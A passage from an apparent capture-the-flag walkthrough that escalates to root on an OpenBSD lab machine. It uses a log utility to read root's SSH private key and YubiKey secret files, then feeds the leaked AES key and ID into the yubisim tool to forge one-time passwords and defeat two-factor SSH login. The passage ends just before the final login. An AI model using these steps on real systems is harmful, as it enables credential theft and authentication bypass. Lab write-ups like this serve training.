+   cat /etc/changelist
+One entry, in particular, catches our attention:
+
+The SSH private key /root/.ssh/id_rsa is in the backup list and can be retrieved by the
+/usr/local/bin/log program (replacing any forward slashes in the file path with underscores):
+
+   /usr/local/bin/log /var/backups/root_.ssh_id_rsa.current
+We save the key locally as root.key , set the correct permissions and use it to SSH to the system as root:
+
+   chmod 400 root.key
+   ssh -i root.key root@10.10.10.247
+
+Unfortunately we are asked for a password:
+More enumeration is required.
+The world-readable file /etc/login.conf is used to describe the attributes of login classes. The root
+account, by default, is member of the daemon class. We read the definition of said class:
+
+   cat /etc/login.conf
+
+We see that auth-ssh is set to yubikey .
+OpenBSD uses the login_yubikey utility to authenticate users with the Yubico OTP mechanism. According to
+the manual, three files are created under /var/db/yubikey :
+
+   /var/db/yubikey/<username>.uid
+   /var/db/yubikey/<username>.key
+   /var/db/yubikey/<username>.ctr
+We can use the /usr/local/bin/log program to access root's yubikey files:
+   /usr/local/bin/log /var/db/yubikey/root.key
+   /usr/local/bin/log /var/db/yubikey/root.uid
+   /usr/local/bin/log /var/db/yubikey/root.ctr
+The /etc/ssh/sshd_config file confirms that root access is configured for 2FA, requiring both a private
+key and a password (which in this case is a YubiKey OTP):
+
+The yubisim tool can be used to emulate a YubiKey and generate OTP values that are printed to standard
+output.
+We clone the repository locally:
+
+   git clone https://github.com/dorchain/yubisim
+We switch to the yubisim directory and compile the yubi_simulator.java file:
+   javac yubi_simulator.java
+We edit the ykfile file by adding the values obtained from root.key (as "Secret AES Key") and root.uid
+(as "Secret ID"). The "Public ID" field can be left unchanged. We also set the counter to a number higher than
+the current counter (which, as we saw from root.ctr , is 3841).
+This is our modified ykfile :
+
+   Yubisim Token 0.1
+   Public ID: gefthtceihdg
+   Secret AES Key: 6bf9a26475388ce998988b67eaa2ea87
+   Secret ID: a4ce1128bde4
+   Counter: 3842
+We run the program to generate a new OTP:
+   java yubi_simulator ykfile
+
+We can now SSH to the system as root :
+
